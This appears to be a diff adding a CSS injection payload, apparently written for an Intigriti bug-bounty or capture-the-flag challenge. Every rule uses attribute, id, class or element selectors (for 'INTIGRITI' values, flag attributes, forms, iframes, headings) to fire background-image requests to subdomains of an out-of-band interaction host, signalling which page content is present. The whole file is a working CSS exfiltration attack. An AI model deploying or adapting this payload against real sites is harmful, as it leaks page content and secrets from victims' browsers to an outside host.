@@ -1,0 +1,19 @@
+/* Test if any element has content containing INTIGRITI */
+body { background: url("http://csshit.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/body"); }
+
+/* Try to detect flag in input/textarea values */
+input[value*="INTIGRITI"] { background: url("http://flag-input.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/"); }
+textarea[value*="INTIGRITI"] { background: url("http://flag-textarea.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/"); }
+*[data-flag] { background: url("http://dataflag.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/"); }
+*[flag] { background: url("http://flagattr.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/"); }
+
+/* Detect various page elements */
+#flag { background: url("http://idflag.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/"); }
+.flag { background: url("http://classflag.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/"); }
+pre { background: url("http://pre.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/"); }
+code { background: url("http://code.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/"); }
+table { background: url("http://table.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/"); }
+form { background: url("http://form.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/"); }
+iframe { background: url("http://iframe-el.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/"); }
+h1 { background: url("http://h1.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/"); }
+h2 { background: url("http://h2.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/"); }
